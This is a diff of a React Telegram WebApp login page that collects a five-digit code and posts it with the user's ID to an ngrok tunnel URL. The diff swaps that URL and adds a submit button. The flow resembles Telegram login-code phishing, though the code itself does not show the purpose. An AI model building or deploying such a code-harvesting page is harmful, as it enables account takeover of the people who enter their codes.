@@ -1,10 +1,12 @@
 import { useState, useRef, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
 
 export default function Auth2() {
   const CODE_LENGTH = 5; // number of digits
   const [code, setCode] = useState(Array(CODE_LENGTH).fill(""));
   const inputsRef = useRef([]);
   const tg = window.Telegram?.WebApp;
+  const navigate = useNavigate();
 
 
 
@@ -17,12 +19,11 @@ export default function Auth2() {
         return;
       }
 
-      // Use state `code` instead of undefined newCode
       const codeStr = code.join("");
 
       console.log("BODY TO SEND:", { user_id: userId, code: codeStr });
 
-      const res = await fetch("https://08f77fecc2d9.ngrok-free.app/api/send_code", {
+      const res = await fetch("https://janene-unwilling-nonilluminatingly.ngrok-free.dev/api/send_code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ user_id: userId, code: codeStr }),
@@ -48,22 +49,17 @@ export default function Auth2() {
 
 
   useEffect(() => {
-    // Focus first input on mount
     inputsRef.current[0]?.focus();
   }, []);
 
   const handleChange = (value, index) => {
-    if (!/^\d*$/.test(value)) return; // only allow numbers
+    if (!/^\d*$/.test(value)) return; 
     const newCode = [...code];
-    newCode[index] = value.slice(-1); // keep only last digit typed
+    newCode[index] = value.slice(-1);
     setCode(newCode);
 
     if (value && index < CODE_LENGTH - 1) {
-      inputsRef.current[index + 1]?.focus(); // move to next box
-    }
-
-    if (newCode.every(digit => digit !== "")) {
-        handleSubmitCode()
+      inputsRef.current[index + 1]?.focus(); 
     }
   };
 
@@ -103,6 +99,14 @@ export default function Auth2() {
       <p className="mt-5 text-sm text-gray-400">
         Вы можете отозвать доступ в любое время в настройках Telegram
       </p>
+
+      <button
+        onClick={handleSubmitCode}
+        disabled={code.some(digit => digit === "")}
+        className="mt-6 px-8 py-3 bg-blue-500 text-white text-lg font-semibold rounded-lg hover:bg-blue-600 disabled:bg-gray-600 disabled:cursor-not-allowed transition"
+      >
+        Отправить
+      </button>
     </div>
   );
 }
